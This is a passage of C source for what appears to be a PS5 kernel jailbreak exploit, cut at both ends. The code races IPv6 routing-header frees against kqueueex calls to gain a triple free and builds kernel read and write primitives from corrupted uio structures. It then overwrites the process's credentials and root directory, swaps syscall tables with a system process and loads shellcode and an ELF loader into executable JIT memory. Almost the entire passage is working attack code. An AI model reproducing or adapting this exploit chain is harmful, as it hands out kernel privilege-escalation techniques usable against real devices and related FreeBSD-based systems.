    CALL(ctx, fn_setuid, 1, 0, 0, 0, 0, 0);
    CALL(ctx, fn_sleep, 10, 0, 0, 0, 0, 0);
    LOG(ctx, "tctf: setuid done\n");

    // Using pthread is unstable for some reason
    for (int i = 0; i < KQEX_THREAD_NUM; i++) {
        kqex_args[i].ctx  = ctx;
        kqex_args[i].core = kqex_cores[i];

        u64 stack  = CALL(ctx, fn_calloc, 1, THR_STACK_SIZE, 0, 0, 0, 0);
        u64 tls    = CALL(ctx, fn_calloc, 1, THR_TLS_SIZE,   0, 0, 0, 0);
        u64 pblock = CALL(ctx, fn_calloc, 1, sizeof(thr_param_t), 0, 0, 0, 0);
        thr_param_t *tp = (thr_param_t*)pblock;

        tp->start_func = (u64)kqex_thread_fn;
        tp->arg        = (u64)&kqex_args[i];
        tp->stack_base = stack;
        tp->stack_size = THR_STACK_SIZE;
        tp->tls_base   = tls;
        tp->tls_size   = THR_TLS_SIZE;
        tp->child_tid  = (u64)&ctx->kqex_threads[i];

        SYSCALL_RAW(ctx, SYS_THR_NEW, pblock, sizeof(thr_param_t), 0, 0, 0);
    }
    LOG(ctx, "tctf: kqex threads spawned (thr_new)\n");

    ctx->kqex_go = 1;

    u32 elapsed_min = 0;
    while (ctx->kqex_done < KQEX_THREAD_NUM) {
        CALL(ctx, fn_sleep, 60, 0, 0, 0, 0, 0);
        elapsed_min++;
        u64 done = ctx->kqex_counter;
        u64 pct  = done / (KQUEUEEX_CALLS / 100);
        u64 eta  = (done == 0) ? 0 :
                   (u64)elapsed_min * (KQUEUEEX_CALLS - done) / done;
        log_progress(ctx, (u32)pct, (u32)eta, done);
    }
    LOG(ctx, "tctf: running remain calls at main thread...\n");
    CALL(ctx, fn_sleep, 5, 0, 0, 0, 0, 0);

    for (u64 n = 0; n < KQUEUEEX_MAIN_CALLS; n++) {
        CALL(ctx, fn_kqueueex, KQUEUEEX_INVALID_PTR, 0, 0, 0, 0, 0);
    }
    CALL(ctx, fn_sleep, 5, 0, 0, 0, 0, 0);

    LOG(ctx, "tctf: Creating /dev/null fds...\n");
    
    for (int i = 0; i < NULL_FD_COUNT; i++) {
        ctx->null_fds[i] = (s32)CALL(ctx, fn_open,
                                     (u64)"/dev/null", O_RDONLY, 0, 0, 0, 0);
        log_hex32(ctx, "tctf: null_fd=", (u32)ctx->null_fds[i]);
    }
    
    CALL(ctx, fn_setuid, 1, 0, 0, 0, 0, 0);
    CALL(ctx, fn_sleep, 10, 0, 0, 0, 0, 0);
    LOG(ctx, "tctf: second setuid done\n");
    
    ctx->free_fd_idx = 0;
    s32 race_ok = 0;
    for (int attempt = 0; attempt < TRIPLEFREE_ATTEMPTS; attempt++) {
        log_hex32(ctx, "tctf: attempt #", (u32)attempt);
        if (attempt_race(ctx)) { race_ok = 1; break; }
    }
    if (!race_ok) {
        LOG(ctx, "tctf: all attempts failed\n");
        return 0;
    }

    LOG(ctx, "tctf: triplets found\n");
    log_hex32(ctx, "tctf: triplets[0] fd=", (u32)ctx->ipv6_socks[ctx->triplets[0]]);
    log_hex32(ctx, "tctf: triplets[1] fd=", (u32)ctx->ipv6_socks[ctx->triplets[1]]);
    log_hex32(ctx, "tctf: triplets[2] fd=", (u32)ctx->ipv6_socks[ctx->triplets[2]]);
    return 1;
}

static s32 leak_kqueue(exploit_ctx_t *ctx)
{
    LOG(ctx, "leakKqueue: enter\n");
    log_hex32(ctx, "leakKqueue: free triplets[1] fd=",
              (u32)ctx->ipv6_socks[ctx->triplets[1]]);

    free_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[1]]);
    LOG(ctx, "leakKqueue: free_rthdr done\n");

    s32 kq = -1;
    for (int attempts = 0; attempts < 10000; attempts++) {
        kq = (s32)CALL(ctx, fn_kqueue, 0, 0, 0, 0, 0, 0);

        ctx->leak_rthdr_len = 0x100;
        get_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[0]],
                  ctx->leak_rthdr, &ctx->leak_rthdr_len);

        if (attempts == 0) {
            log_hex32(ctx, "leakKqueue: kq fd=", (u32)kq);
            log_hex64(ctx, "leakKqueue: rthdr[0x08]=",
                      GET64(ctx->leak_rthdr, 0x08));
            log_hex64(ctx, "leakKqueue: rthdr[KQ_FDP]=",
                      GET64(ctx->leak_rthdr, KQ_FDP_OFFSET));
        }

        if (GET64(ctx->leak_rthdr, 0x08) == 0x1430000 &&
            GET64(ctx->leak_rthdr, KQ_FDP_OFFSET) != 0)
            break;

        CALL(ctx, fn_close, kq, 0, 0, 0, 0, 0);
        CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);
        kq = -1;
    }

    ctx->kl_lock = GET64(ctx->leak_rthdr, 0x60);
    ctx->kq_fdp  = GET64(ctx->leak_rthdr, KQ_FDP_OFFSET);

    log_hex64(ctx, "leakKqueue: kq_fdp=",  ctx->kq_fdp);

    if (ctx->kq_fdp == 0) {
        LOG(ctx, "leakKqueue: kq_fdp is zero\n");
        return 0;
    }

    CALL(ctx, fn_close, kq, 0, 0, 0, 0, 0);

    s32 ret = find_triplet(ctx, ctx->triplets[0], ctx->triplets[2]);
    if (ret < 0) { LOG(ctx, "leakKqueue: triplet not found\n"); return 0; }
    ctx->triplets[1] = ret;
    log_hex32(ctx, "leakKqueue: new triplets[1] fd=",
              (u32)ctx->ipv6_socks[ctx->triplets[1]]);
    return 1;
}

static void build_uio(u8 *uio, u64 uio_iov, u64 uio_td,
                      s32 is_read, u64 addr, u64 size)
{
    PUT64(uio, 0x00, uio_iov);
    PUT64(uio, 0x08, UIO_IOV_NUM);
    PUT64(uio, 0x10, (u64)-1LL);                          
    PUT64(uio, 0x18, size);                               
    PUT32(uio, 0x20, UIO_SYSSPACE);                       
    PUT32(uio, 0x24, is_read ? UIO_WRITE : UIO_READ);     
    PUT64(uio, 0x28, uio_td);                             
    PUT64(uio, 0x30, addr);                               
    PUT64(uio, 0x38, size);                               
}

static u8 *kread_slow(exploit_ctx_t *ctx, u64 addr, s32 size)
{
    u8 **leak_bufs = (u8**)CALL(ctx, fn_calloc,
                                UIO_THREAD_NUM, sizeof(u8*), 0, 0, 0, 0);
    for (int i = 0; i < UIO_THREAD_NUM; i++)
        leak_bufs[i] = (u8*)CALL(ctx, fn_calloc, 1, (u64)size, 0, 0, 0, 0);

    u32 buf_sz = (u32)size * UIO_THREAD_NUM;
    CALL(ctx, fn_setsockopt, ctx->uio_ss[1], SOL_SOCKET, SO_SNDBUF,
         (u64)&buf_sz, 4, 0);

    
    for (int i = 0; i < size; i++) ctx->tmp[i] = 0x41;
    CALL(ctx, fn_write, ctx->uio_ss[1], (u64)ctx->tmp, (u64)size, 0, 0, 0);

    PUT64(ctx->uio_iov_read, 0x08, (u64)size);

    free_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[1]]);

    while (1) {
        worker_signal_work(&ctx->uio_state, COMMAND_UIO_READ);
        CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);

        ctx->leak_rthdr_len = 0x10;
        get_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[0]],
                  ctx->leak_rthdr, &ctx->leak_rthdr_len);

        if (GET32(ctx->leak_rthdr, 0x08) == UIO_IOV_NUM) break;

        CALL(ctx, fn_read, ctx->uio_ss[0], (u64)ctx->tmp, (u64)size, 0, 0, 0);
        for (int i = 0; i < UIO_THREAD_NUM; i++)
            CALL(ctx, fn_read, ctx->uio_ss[0],
                 (u64)leak_bufs[i], (u64)size, 0, 0, 0);
        worker_wait_for_finished(&ctx->uio_state);
        CALL(ctx, fn_write, ctx->uio_ss[1], (u64)ctx->tmp, (u64)size, 0, 0, 0);
    }

    u64 uio_iov_ptr = GET64(ctx->leak_rthdr, 0x00);
    build_uio(ctx->msg_iov, uio_iov_ptr, 0, 1, addr, (u64)size);

    free_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[2]]);

    while (1) {
        worker_signal_work(&ctx->iov_state, 0);
        CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);

        ctx->leak_rthdr_len = 0x40;
        get_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[0]],
                  ctx->leak_rthdr, &ctx->leak_rthdr_len);

        if (GET32(ctx->leak_rthdr, 0x20) == UIO_SYSSPACE) break;

        CALL(ctx, fn_write, ctx->iov_ss[1], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
        worker_wait_for_finished(&ctx->iov_state);
        CALL(ctx, fn_read,  ctx->iov_ss[0], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
    }

    CALL(ctx, fn_read, ctx->uio_ss[0], (u64)ctx->tmp, (u64)size, 0, 0, 0);

    u8 *result = 0;
    for (int i = 0; i < UIO_THREAD_NUM; i++) {
        CALL(ctx, fn_read, ctx->uio_ss[0],
             (u64)leak_bufs[i], (u64)size, 0, 0, 0);
        if (GET64(leak_bufs[i], 0x00) != 0x4141414141414141ULL) {
            ctx->triplets[1] = find_triplet(ctx, ctx->triplets[0], -1);
            result = leak_bufs[i];
        }
    }
    worker_wait_for_finished(&ctx->uio_state);

    CALL(ctx, fn_write, ctx->iov_ss[1], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
    ctx->triplets[2] = find_triplet(ctx, ctx->triplets[0], ctx->triplets[1]);
    worker_wait_for_finished(&ctx->iov_state);
    CALL(ctx, fn_read,  ctx->iov_ss[0], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);

    CALL(ctx, fn_free, (u64)leak_bufs, 0, 0, 0, 0, 0);
    return result;
}

static u64 kread_slow64(exploit_ctx_t *ctx, u64 addr)
{
    return GET64(kread_slow(ctx, addr, 8), 0x00);
}

static void kwrite_slow(exploit_ctx_t *ctx, u64 addr, u8 *buf, s32 size)
{
    u32 buf_sz = (u32)size * UIO_THREAD_NUM;
    CALL(ctx, fn_setsockopt, ctx->uio_ss[1], SOL_SOCKET, SO_SNDBUF,
         (u64)&buf_sz, 4, 0);

    PUT64(ctx->uio_iov_write, 0x08, (u64)size);

    free_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[1]]);

    while (1) {
        worker_signal_work(&ctx->uio_state, COMMAND_UIO_WRITE);
        CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);

        ctx->leak_rthdr_len = 0x10;
        get_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[0]],
                  ctx->leak_rthdr, &ctx->leak_rthdr_len);

        if (GET32(ctx->leak_rthdr, 0x08) == UIO_IOV_NUM) break;

        for (int i = 0; i < UIO_THREAD_NUM; i++)
            CALL(ctx, fn_write, ctx->uio_ss[1], (u64)buf, (u64)size, 0, 0, 0);
        worker_wait_for_finished(&ctx->uio_state);
    }

    u64 uio_iov_ptr = GET64(ctx->leak_rthdr, 0x00);
    build_uio(ctx->msg_iov, uio_iov_ptr, 0, 0, addr, (u64)size);

    free_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[2]]);

    while (1) {
        worker_signal_work(&ctx->iov_state, 0);
        CALL(ctx, fn_sched_yield, 0, 0, 0, 0, 0, 0);

        ctx->leak_rthdr_len = 0x40;
        get_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[0]],
                  ctx->leak_rthdr, &ctx->leak_rthdr_len);

        if (GET32(ctx->leak_rthdr, 0x20) == UIO_SYSSPACE) break;

        CALL(ctx, fn_write, ctx->iov_ss[1], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
        worker_wait_for_finished(&ctx->iov_state);
        CALL(ctx, fn_read,  ctx->iov_ss[0], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
    }

    for (int i = 0; i < UIO_THREAD_NUM; i++)
        CALL(ctx, fn_write, ctx->uio_ss[1], (u64)buf, (u64)size, 0, 0, 0);

    ctx->triplets[1] = find_triplet(ctx, ctx->triplets[0], -1);
    worker_wait_for_finished(&ctx->uio_state);

    CALL(ctx, fn_write, ctx->iov_ss[1], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
    ctx->triplets[2] = find_triplet(ctx, ctx->triplets[0], ctx->triplets[1]);
    worker_wait_for_finished(&ctx->iov_state);
    CALL(ctx, fn_read, ctx->iov_ss[0], (u64)ctx->tmp, IOV_THREAD_NUM, 0, 0, 0);
}

static u64 find_allproc(exploit_ctx_t *ctx)
{
    s32 pipe_fd[2];
    CALL(ctx, fn_pipe, (u64)pipe_fd, 0, 0, 0, 0, 0);

    s32 pid = (s32)CALL(ctx, fn_getpid, 0, 0, 0, 0, 0, 0);
    CALL(ctx, fn_ioctl, pipe_fd[0], FIOSETOWN, (u64)&pid, 0, 0, 0);

    u64 fp      = fget(ctx, pipe_fd[0]);
    u64 f_data  = kread64(ctx, fp + 0x00);
    u64 sigio   = kread64(ctx, f_data + PIPE_SIGIO_OFFSET);
    ctx->curproc = kread64(ctx, sigio);

    u64 p = ctx->curproc;
    while ((p & 0xFFFFFFFF00000000ULL) != 0xFFFFFFFF00000000ULL)
        p = kread64(ctx, p + 0x08);  

    CALL(ctx, fn_close, pipe_fd[1], 0, 0, 0, 0, 0);
    CALL(ctx, fn_close, pipe_fd[0], 0, 0, 0, 0, 0);
    return p;
}

static u64 pfind(exploit_ctx_t *ctx, s32 pid)
{
    u64 p = kread64(ctx, ctx->allproc);
    while (p != 0) {
        if ((s32)kread32(ctx, p + P_PID_OFFSET) == pid) break;
        p = kread64(ctx, p + 0x00);  
    }
    return p;
}

static void remove_rthr_from_socket(exploit_ctx_t *ctx, s32 fd)
{
    u64 fp = fget(ctx, fd);
    if ((fp ^ 0x8000000000000000ULL) > 0x7FFF000000000000ULL) {
        u64 f_data           = kread64(ctx, fp + 0x00);
        u64 so_pcb           = kread64(ctx, f_data + 0x18);
        u64 in6p_outputopts  = kread64(ctx, so_pcb + IN6P_OUTPUTOPTS_OFFSET);
        kwrite64(ctx, in6p_outputopts + IP6PO_RHI_RTHDR_OFFSET, 0);
    }
}

static s32 ps5_jailbreak(exploit_ctx_t *ctx)
{
    u64 p      = ctx->curproc;
    u64 p_ucred = kread64(ctx, p + 0x40);

    kwrite32(ctx, p_ucred + 0x04, 0);  
    kwrite32(ctx, p_ucred + 0x08, 0);  
    kwrite32(ctx, p_ucred + 0x0C, 0);  
    kwrite32(ctx, p_ucred + 0x10, 1);  
    kwrite32(ctx, p_ucred + 0x14, 0);  
    kwrite32(ctx, p_ucred + 0x18, 0);  

    kwrite64(ctx, p_ucred + 0x58, SYSCORE_AUTHID);          
    kwrite64(ctx, p_ucred + 0x60, 0xFFFFFFFFFFFFFFFFULL);   
    kwrite64(ctx, p_ucred + 0x68, 0xFFFFFFFFFFFFFFFFULL);   
    
    log_hex32(ctx, "pre-patch ucred+0x82=", kread8(ctx, p_ucred + 0x82));
    
    kwrite8 (ctx, p_ucred + 0x82, 0x00);  // This is ps2emu exclusive patch to bypass socket restriction
    kwrite8 (ctx, p_ucred + 0x83, 0x80);                    

    
    u64 p_fd = kread64(ctx, p + 0x48);
    u64 kern = pfind(ctx, KERNEL_PID);
    u64 kern_fd   = kread64(ctx, kern + 0x48);
    u64 rootvnode = kread64(ctx, kern_fd + ROOTVNODE_OFFSET);

    kwrite64(ctx, p_fd + 0x08, rootvnode);
    kwrite64(ctx, p_fd + 0x10, rootvnode);
    kwrite64(ctx, p_fd + 0x18, 0);           

    
    u64 p_dynlib     = kread64(ctx, p + 0x3E8);
    kwrite64(ctx, p_dynlib + 0xF0, 0);                       
    kwrite64(ctx, p_dynlib + 0xF8, 0xFFFFFFFFFFFFFFFFULL);   

    
    u64 dynlib_eboot  = kread64(ctx, p_dynlib + 0x00);
    u64 eboot_segs    = kread64(ctx, dynlib_eboot + 0x40);
    kwrite64(ctx, eboot_segs + 0x08, 0);                      
    kwrite64(ctx, eboot_segs + 0x10, 0xFFFFFFFFFFFFFFFFULL);  

    return 1;
}

typedef struct {
    u64 sysent_addr;
    u32 orig_size;
    u64 orig_tbl;
} sysent_save_t;

typedef struct {
    u8  *elfldr_data;
    u64  elfldr_size;
    u64  entry;
    u64  sysent_off;
    u64  comm_off;
    u64  target;
} aio_ctx_t;

static s32 str_eq(const char *a, const char *b)
{
    while (*a && *b && *a == *b) { a++; b++; }
    return *a == *b;
}

static void find_proc_offsets(exploit_ctx_t *ctx, u64 *sysent_off, u64 *comm_off)
{
    u8 *buf = (u8*)CALL(ctx, fn_calloc, 1, 0x1000, 0, 0, 0, 0);
    kread(ctx, ctx->curproc, buf, 0x1000);

    *sysent_off = (u64)-1;
    for (int i = 0; i <= 0x1000 - 8; i++) {
        if (GET64(buf, i) == 0x7FFFFFFFFFFFFFFFULL) {
            if (i >= 0x10) *sysent_off = (u64)(i - 0x10);
            break;
        }
    }

    *comm_off = (u64)-1;
    for (int i = 0; i <= 0x1000 - 6; i++) {
        if (buf[i+0] == 0xCE && buf[i+1] == 0xFA &&
            buf[i+2] == 0xEF && buf[i+3] == 0xBE &&
            buf[i+4] == 0xCC && buf[i+5] == 0xBB) {
            *comm_off = (u64)(i + 8);
            break;
        }
    }

    CALL(ctx, fn_free, (u64)buf, 0, 0, 0, 0, 0);
}

static void read_procname(exploit_ctx_t *ctx, u64 proc, u64 comm_off, char *out)
{
    u8 buf[32];
    kread(ctx, proc + comm_off, buf, 32);
    int i;
    for (i = 0; i < 31; i++) {
        u8 ch = buf[i];
        if (ch == 0) break;
        if (ch < 0x20 || ch > 0x7E) { i = 0; break; }
        out[i] = (char)ch;
    }
    out[i] = '\0';
}

static u64 find_native_process(exploit_ctx_t *ctx, u64 comm_off)
{
    const char *targets[2];
    targets[0] = "SceRedisServer"; targets[1] = 0;
    u64 p = kread64(ctx, ctx->allproc);
    log_hex64(ctx, "aio: first proc=", p);
    char name[32];
    s32 checked = 0;
    while (p && (p >> 48) == 0xFFFF) {
        read_procname(ctx, p, comm_off, name);
        for (int i = 0; targets[i]; i++) {
            if (str_eq(name, targets[i])) {
                log_hex64(ctx, "aio: native proc=", p);
                return p;
            }
        }
        p = kread64(ctx, p + 0x00);
        checked++;
        if (checked % 20 == 0)
            log_hex32(ctx, "aio: procs checked=", (u32)checked);
    }
    log_hex32(ctx, "aio: walk ended at checked=", (u32)checked);
    log_hex64(ctx, "aio: last p=", p);
    return 0;
}

static void swap_sysent(exploit_ctx_t *ctx, u64 sysent_off, u64 target, sysent_save_t *sv)
{
    u64 our   = kread64(ctx, ctx->curproc + sysent_off);
    u64 their = kread64(ctx, target + sysent_off);
    sv->sysent_addr = our;
    sv->orig_size   = kread32(ctx, our);
    sv->orig_tbl    = kread64(ctx, our + 0x8);
    kwrite32(ctx, our,       kread32(ctx, their));
    kwrite64(ctx, our + 0x8, kread64(ctx, their + 0x8));
}

static void restore_sysent(exploit_ctx_t *ctx, sysent_save_t *sv)
{
    kwrite32(ctx, sv->sysent_addr,       sv->orig_size);
    kwrite64(ctx, sv->sysent_addr + 0x8, sv->orig_tbl);
}

static u8 *read_file(exploit_ctx_t *ctx, const char *path, u64 *size_out)
{
    s32 fd = (s32)CALL(ctx, fn_open, (u64)path, O_RDONLY, 0, 0, 0, 0);
    if (fd < 0) return 0;
    s64 sz = (s64)CALL(ctx, fn_lseek, fd, 0, SEEK_END, 0, 0, 0);
    CALL(ctx, fn_lseek, fd, 0, SEEK_SET, 0, 0, 0);
    if (sz <= 0) { CALL(ctx, fn_close, fd, 0, 0, 0, 0, 0); return 0; }
    u8 *buf = (u8*)CALL(ctx, fn_calloc, 1, (u64)sz, 0, 0, 0, 0);
    CALL(ctx, fn_read, fd, (u64)buf, (u64)sz, 0, 0, 0);
    CALL(ctx, fn_close, fd, 0, 0, 0, 0, 0);
    *size_out = (u64)sz;
    return buf;
}

static s32 find_file(exploit_ctx_t *ctx, const char *title_id,
                     const char *filename, char *out_path)
{
    if (!ctx->fn_open) { LOG(ctx, "find_file: fn_open null\n"); return 0; }
    log_hex64(ctx, "find_file: fn_open=", (u64)ctx->fn_open);
    const char *slots[4];
    slots[0] = "_000"; slots[1] = "_001"; slots[2] = "_002"; slots[3] = 0;
    for (int i = 0; slots[i]; i++) {
        char *p = out_path;
        const char *s;
        s = "/mnt/sandbox/";             while (*s) *p++ = *s++;
        s = title_id;                    while (*s) *p++ = *s++;
        s = slots[i];                    while (*s) *p++ = *s++;
        s = "/savedata0/lua/elf_jb/";   while (*s) *p++ = *s++;
        s = filename;                    while (*s) *p++ = *s++;
        *p = '\0';
        log_send(ctx, out_path); log_send(ctx, "\n");
        s32 fd = (s32)CALL(ctx, fn_open, (u64)out_path, O_RDONLY, 0, 0, 0, 0);
        log_hex32(ctx, "find_file: open ret=", (u32)fd);
        if (fd >= 0) { CALL(ctx, fn_close, fd, 0, 0, 0, 0, 0); return 1; }
    }
    return 0;
}

static u64 map_shellcode(exploit_ctx_t *ctx, u8 *data, u64 size)
{
    u64 aligned = (size + PAGE_SIZE - 1) & ~((u64)PAGE_SIZE - 1);
    if (!aligned) aligned = PAGE_SIZE;
    s32 exec_fd = -1;
    CALL(ctx, fn_jit_create, 0, aligned, PROT_RWX, (u64)&exec_fd, 0, 0);
    if (exec_fd < 0) return 0;
    u64 addr = (u64)CALL(ctx, fn_mmap, 0, aligned, PROT_RWX, MAP_SHARED,
                         (u64)exec_fd, 0);
    if (!addr || addr == (u64)-1) return 0;
    u8 *dst = (u8*)addr;
    for (u64 i = 0; i < size; i++) dst[i] = data[i];
    log_hex64(ctx, "aio: shellcode mapped=", addr);
    return addr;
}

static void run_shellcode(exploit_ctx_t *ctx, u64 entry,
                          u64 elfldr_addr, u64 elfldr_size)
{
    u8 *args = (u8*)CALL(ctx, fn_calloc, 1, 0x28, 0, 0, 0, 0);
    PUT32(args, 0x00, ctx->master_pipe[0]);
    PUT32(args, 0x04, ctx->master_pipe[1]);
    PUT32(args, 0x08, ctx->victim_pipe[0]);
    PUT32(args, 0x0C, ctx->victim_pipe[1]);
    PUT64(args, 0x10, ctx->allproc);
    PUT64(args, 0x18, elfldr_addr);
    PUT64(args, 0x20, elfldr_size);

    u64 thread = 0;
    eboot_wrap(ctx->gadget, (void*)ctx->fn_pthread_create,
               (u64)&thread, 0, entry, (u64)args, 0, 0);
    log_hex64(ctx, "aio: thread=", thread);
    eboot_wrap(ctx->gadget, (void*)ctx->fn_pthread_join,
               thread, 0, 0, 0, 0, 0);

    CALL(ctx, fn_free, (u64)args, 0, 0, 0, 0, 0);
}

static s32 aio_prepare(exploit_ctx_t *ctx, const char *title_id, aio_ctx_t *aio)
{
    LOG(ctx, "aio: prepare\n");

    find_proc_offsets(ctx, &aio->sysent_off, &aio->comm_off);
    log_hex64(ctx, "aio: sysent_off=", aio->sysent_off);
    log_hex64(ctx, "aio: comm_off=",   aio->comm_off);

    if (aio->sysent_off == (u64)-1 || aio->comm_off == (u64)-1) {
        LOG(ctx, "aio: proc offsets not found\n");
        return 0;
    }

    aio->target = find_native_process(ctx, aio->comm_off);
    if (!aio->target) { LOG(ctx, "aio: native proc not found\n"); return 0; }

    LOG(ctx, "aio: finding elfldr\n");
    char elfldr_path[512];
    if (!find_file(ctx, title_id, "elfldr_quieter.elf", elfldr_path)) {
        LOG(ctx, "aio: elfldr not found\n");
        return 0;
    }
    LOG(ctx, "aio: reading elfldr\n");
    aio->elfldr_data = read_file(ctx, elfldr_path, &aio->elfldr_size);
    if (!aio->elfldr_data) { LOG(ctx, "aio: elfldr read failed\n"); return 0; }
    log_hex64(ctx, "aio: elfldr_size=", aio->elfldr_size);

    char bin_path[512];
    s32 usb_fd = (s32)CALL(ctx, fn_open, (u64)"/mnt/usb0/kexp_debug.bin",
                           O_RDONLY, 0, 0, 0, 0);
    if (usb_fd >= 0) {
        CALL(ctx, fn_close, usb_fd, 0, 0, 0, 0, 0);
        const char *s = "/mnt/usb0/kexp_debug.bin";
        char *p = bin_path; while (*s) *p++ = *s++; *p = '\0';
        LOG(ctx, "aio: using usb kexp_debug.bin\n");
    } else {
        if (!find_file(ctx, title_id, "kexp_quieter.bin", bin_path)) {
            LOG(ctx, "aio: kexp bin not found\n");
            CALL(ctx, fn_free, (u64)aio->elfldr_data, 0, 0, 0, 0, 0);
            aio->elfldr_data = 0;
            return 0;
        }
    }

    LOG(ctx, "aio: reading bin\n");
    u64 bin_size = 0;
    u8 *bin_data = read_file(ctx, bin_path, &bin_size);
    if (!bin_data) {
        LOG(ctx, "aio: bin read failed\n");
        CALL(ctx, fn_free, (u64)aio->elfldr_data, 0, 0, 0, 0, 0);
        aio->elfldr_data = 0;
        return 0;
    }
    log_hex64(ctx, "aio: bin_size=", bin_size);

    aio->entry = map_shellcode(ctx, bin_data, bin_size);
    CALL(ctx, fn_free, (u64)bin_data, 0, 0, 0, 0, 0);

    if (!aio->entry) {
        LOG(ctx, "aio: map failed\n");
        CALL(ctx, fn_free, (u64)aio->elfldr_data, 0, 0, 0, 0, 0);
        aio->elfldr_data = 0;
        return 0;
    }

    LOG(ctx, "aio: prepare done\n");
    return 1;
}

static void aio_run(exploit_ctx_t *ctx, aio_ctx_t *aio)
{
    LOG(ctx, "aio: run\n");
    sysent_save_t sv;
    swap_sysent(ctx, aio->sysent_off, aio->target, &sv);
    LOG(ctx, "aio: sysent swapped\n");
    run_shellcode(ctx, aio->entry, (u64)aio->elfldr_data, aio->elfldr_size);
    restore_sysent(ctx, &sv);
    LOG(ctx, "aio: sysent restored\n");
    CALL(ctx, fn_free, (u64)aio->elfldr_data, 0, 0, 0, 0, 0);
    aio->elfldr_data = 0;
    LOG(ctx, "aio: done\n");
}

static void cleanup(exploit_ctx_t *ctx)
{
    for (int i = 0; i < IPV6_SOCK_NUM; i++)
        CALL(ctx, fn_close, ctx->ipv6_socks[i], 0, 0, 0, 0, 0);

    CALL(ctx, fn_close, ctx->uio_ss[1], 0, 0, 0, 0, 0);
    CALL(ctx, fn_close, ctx->uio_ss[0], 0, 0, 0, 0, 0);
    CALL(ctx, fn_close, ctx->iov_ss[1], 0, 0, 0, 0, 0);
    CALL(ctx, fn_close, ctx->iov_ss[0], 0, 0, 0, 0, 0);
    
}

__attribute__((section(".text.start")))
u64 main(u64 arg1, u64 arg2, u64 arg3, u64 arg4, u64 arg5, u64 arg6)
{
    u64 *info = (u64*)arg1;

    exploit_ctx_t ctx = {0};
    ctx.gadget         = (void*)(info[0] + GADGET_OFFSET);
    ctx.log_sock       = (s32)arg2;

    ctx.log_addr[0] = 16;
    ctx.log_addr[1] = AF_INET;
    *(u16*)(ctx.log_addr+2) = 0x901F;
    *(u32*)(ctx.log_addr+4) = parse_ipv4((const char*)arg3);

    s32 *ipv6_fd_src = (s32*)arg5;
    for (int i = 0; i < IPV6_SOCK_NUM; i++)
        ctx.ipv6_socks[i] = ipv6_fd_src[i];

    dlsym_t dlsym = (dlsym_t)info[1];

    
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "sendto", (void**)&ctx.fn_sendto);
    LOG(&ctx, "init: sendto resolved\n");

    
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "socket",             (void**)&ctx.fn_socket);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "socketpair",         (void**)&ctx.fn_socketpair);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "dup",                (void**)&ctx.fn_dup);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "close",              (void**)&ctx.fn_close);

    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "setuid",             (void**)&ctx.fn_setuid);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "getpid",             (void**)&ctx.fn_getpid);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "kqueue",             (void**)&ctx.fn_kqueue);

    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "setsockopt",         (void**)&ctx.fn_setsockopt);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "getsockopt",         (void**)&ctx.fn_getsockopt);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "recvmsg",            (void**)&ctx.fn_recvmsg);

    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "read",               (void**)&ctx.fn_read);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "readv",              (void**)&ctx.fn_readv);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "write",              (void**)&ctx.fn_write);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "writev",             (void**)&ctx.fn_writev);

    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "ioctl",              (void**)&ctx.fn_ioctl);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "pipe",               (void**)&ctx.fn_pipe);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "fcntl",              (void**)&ctx.fn_fcntl);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "sched_yield",        (void**)&ctx.fn_sched_yield);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "sleep",              (void**)&ctx.fn_sleep);

    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "cpuset_setaffinity", (void**)&ctx.fn_cpuset_setaffinity);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "rtprio_thread",      (void**)&ctx.fn_rtprio_thread);

    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "__sys_kqueueex",      (void**)&ctx.fn_kqueueex);

    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "pthread_create",         (void**)&ctx.fn_pthread_create);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "pthread_join",           (void**)&ctx.fn_pthread_join);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "pthread_mutex_init",     (void**)&ctx.fn_mutex_init);
